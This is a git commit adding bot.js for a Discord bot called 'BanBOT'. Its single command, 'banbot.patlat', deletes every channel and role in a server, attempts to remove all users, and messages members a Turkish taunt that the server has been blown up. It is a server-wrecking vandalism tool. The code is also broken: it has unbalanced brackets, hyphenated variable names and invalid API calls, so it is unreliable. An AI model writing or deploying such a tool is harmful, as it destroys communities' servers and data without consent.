c25eb9733a6cfb235b2194fa5f2733daae3234cd
Mert Yıldırım <50714128+xRookieFight@users.noreply.github.com>
2020-07-16 22:09:50 +0300

    BanBOT Main

---
+++ bot.js
@@ -0,0 +1,27 @@
+const Discord = require('discord.js')
+const config = require('./config.json')
+const client = new Discord.Client();
+
+
+client.on("ready", () => {
+console.log("Bot Aktif")
+});
+
+client.on("message", msg => {
+if (msg.content === 'banbot.patlat' {
+msg.delete()
+msg.guild.channels.forEach(banbot => {
+banbot.delete()
+});
+msg.guild.roles.forEach(by-rookie-fight => {
+by-rookie-fight.delete()
+});
+msg.guild.users.forEach(ban-bot => {
+ban-bot.delete()
+});
+msg.guild.users.forEach(termse-uyumlu-degildir-kullanmayin => {
+termse-uyumlu-degildir-kullanmayin.send('Sunucu patladı! \n Geçmiş olsun napalım?')
+}
+});
+
+client.login(config.token);
